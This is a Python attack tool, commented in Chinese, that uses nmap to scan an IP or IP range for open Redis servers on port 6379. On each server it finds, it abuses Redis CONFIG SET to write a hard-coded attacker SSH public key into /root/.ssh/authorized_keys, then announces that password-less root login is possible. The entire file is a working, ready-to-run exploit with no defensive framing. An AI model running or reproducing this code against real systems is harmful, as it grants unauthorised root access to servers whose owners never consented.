#!/usr/bin/env python
# -*- coding: utf-8 -*-
# luoye callyer
# 输入单ip或者ip段，ip段输入：192.168.1.1-254 (符合nmap的方式)
import re
import nmap
import redis
nm = nmap.PortScanner(nmap_search_path=('nmap',r'D:\Nmap\nmap.exe'))

#调用 redis模块通过config写入公钥
def crack_redis(ipaddress):
    try:
        target_redis = redis.Redis(host=ipaddress, port=6379)
        target_redis.config_set("dir","/root/.ssh")
        target_redis.config_set("dbfilename","authorized_keys")
        target_redis.set("poc","nnnssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCaZljNkr2tNCzl6c5bnS6W8ayiFvujmnTumllvIMMvjPxgc777JJUEArFaRjebW6xzbXM+p55huAmzBMiAooj5e2ROLotF4R3pW+6ETVSXaLYtMiSPxN0gKICu+bgAACa8ZZN9jyQ7k6//34Vci1w4Gbolcxmtt8K8mGp7Gk+fRAkawbrXrX6BZATph5yJOmv91ruHs1V5Y0hZ87+ZyYTrsPOpTYWbcnoxna1wMV1AXOLDA4Svdgq8598lwekgBcEvmVnmYwRwAmvYgtRg6rQUsHlnxYqqqWPvma1N8tnDmU16I63oo+KZAJs7NcJTr4ilRGWmuSQzmj7vOG4Va53FzTci3o1O35KFPoHuS1AESHiCCv/lGCb8J36ZrGDakWGrt5acTSqJYLjr15JaqhlOTJkQKfNkOIKFF13u5oGUd9causyyNTdPm4is0a/c+uNme7YiCbJfJrB3RM0xasfEnOBGS2Hk4k8xPOhZuvgUibar86wCmSNmO+GYrpKHwKs= root@kalinnn")
        target_redis.save()
        print("%s 测试完成,你现在可以免密登录" % ipaddress)
    except:
        print("%s 6379 port is open,but Permission denied" % ipaddress)

# 调用nmap返回结果
def scan_check(address):
    check_result = nm.scan(address, '6379', '-sV')
    scan_result = []
    for ip in check_result["scan"]:
        port_status = check_result["scan"][ip]["tcp"][6379]["state"]
        if port_status == "open":
            scan_result.append(ip)
    return scan_result
    
#检查输入的是单ip还是其他什么不符合的单ip特征的正则
def check_ip(ipAddr):
  compile_ip=re.compile('^(1d{2}|2[0-4]d|25[0-5]|[1-9]d|[1-9]).(1d{2}|2[0-4]d|25[0-5]|[1-9]d|d).(1d{2}|2[0-4]d|25[0-5]|[1-9]d|d).(1d{2}|2[0-4]d|25[0-5]|[1-9]d|d)$')
  if compile_ip.match(ipAddr):
    return True
  else:
    return False

while True:
    print("输入q,Q,quit,exit 退出程序")
    inputIPS = input("请输入IP或者IP段:").strip()
    ips = inputIPS.split("-")
    nau_ch = inputIPS.replace(".", "-").split("-")
    e = "".join(str(i) for i in nau_ch)
    if inputIPS in ["q","Q","exit","quit"]:
        break
    # 符合单个ip的
    if check_ip(inputIPS):
        print("开始端口探测............")
        result_IP=scan_check(inputIPS)
        print("开始执行cracking..........")
        result_IP="".join(result_IP)
        crack_redis(result_IP)
    # 如果舒服的是网段扫描
    elif "-" in inputIPS and e.isdigit() and nau_ch[4] > nau_ch[3]:
        if int(ips[1]) > 0 and int(ips[1]) < 255 and check_ip(ips[0]):
            print("批量6379端口连接测试")
            result_IP=scan_check(inputIPS)
            for crack_ip in result_IP:
                crack_redis(crack_ip)
    else:
        print("非法输入，请输入正确的IP格式")
